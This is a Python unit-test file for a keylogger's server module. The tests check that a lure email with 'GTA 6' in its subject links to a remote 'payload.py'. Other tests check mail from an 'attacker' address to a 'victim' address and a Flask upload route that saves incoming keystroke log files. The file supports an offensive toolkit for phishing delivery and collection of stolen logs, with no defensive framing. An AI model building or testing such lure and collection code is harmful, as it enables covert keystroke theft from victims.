import unittest
import os
from datetime import datetime
from email.message import EmailMessage
from keylogger_cli import send_email, compose_email, UPLOAD_FOLDER, upload, app

class TestKeyloggerServer(unittest.TestCase):

    def test_compose_email(self):
        github_link = "https://raw.githubusercontent.com/example/payload.py"
        subject, body = compose_email(github_link)
        self.assertIn("GTA 6", subject)
        self.assertIn(github_link, body)
        self.assertTrue(body.startswith("\nHey"))

    def test_send_email_format(self):
        # This is a format test — not actually sending email
        sender = "attacker@example.com"
        password = "fakepassword"
        receiver = "victim@example.com"
        subject = "Test Subject"
        body = "This is a test email"

        msg = EmailMessage()
        msg["Subject"] = subject
        msg["From"] = sender
        msg["To"] = receiver
        msg.set_content(body)

        self.assertEqual(msg["From"], sender)
        self.assertEqual(msg["To"], receiver)
        self.assertEqual(msg["Subject"], subject)
        self.assertEqual(msg.get_content().strip(), body)

    def test_upload_folder_exists(self):
        self.assertTrue(os.path.exists(UPLOAD_FOLDER))
        self.assertTrue(os.path.isdir(UPLOAD_FOLDER))

    def test_upload_route_no_file(self):
        with app.test_client() as client:
            response = client.post('/upload', data={})
            self.assertEqual(response.status_code, 400)
            self.assertIn(b"No file uploaded", response.data)

    def test_upload_route_file_save(self):
        with app.test_client() as client:
            data = {
                'logfile': (open(__file__, 'rb'), 'test_log.json')  # using this script file as dummy
            }
            response = client.post('/upload', data=data, content_type='multipart/form-data')
            self.assertEqual(response.status_code, 200)
            self.assertIn(b"File uploaded", response.data)

            # Check if file was created
            now = datetime.now().strftime("%Y-%m-%d")
            matching_files = [f for f in os.listdir(UPLOAD_FOLDER) if f.startswith(f"log_{now}")]
            self.assertTrue(len(matching_files) > 0)


if __name__ == "__main__":
    unittest.main()
